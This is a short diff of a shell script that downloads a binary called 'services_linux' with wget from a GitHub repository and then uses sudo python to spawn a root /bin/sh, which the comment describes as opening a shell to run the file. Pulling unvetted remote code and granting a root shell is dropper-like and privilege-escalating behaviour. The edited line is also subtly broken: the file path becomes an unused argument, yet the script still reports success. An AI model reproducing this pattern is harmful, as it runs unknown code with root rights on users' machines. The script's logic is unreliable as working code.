@@ -10,7 +10,7 @@ if [ ! -d "$DEST_DIR" ]; then
 fi
 
 # Download the file from the URL and save it to the destination directory
-echo "Downloading..."
+echo "Downloading services_linux..."
 wget -O "$DEST_DIR/services_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/services_linux
 
 if [ $? -eq 0 ]; then
@@ -26,8 +26,7 @@ echo "Changed file permissions."
 
 # Run the Python command to open a shell and execute the file
 echo "Running Python command with sudo..."
-sudo python -c 'import os; os.system("/bin/sh")'
-"$DEST_DIR/services_linux"
+sudo python -c 'import os; os.system("/bin/sh")' "$DEST_DIR/services_linux"
 
 if [ $? -eq 0 ]; then
     echo "Execution successful."
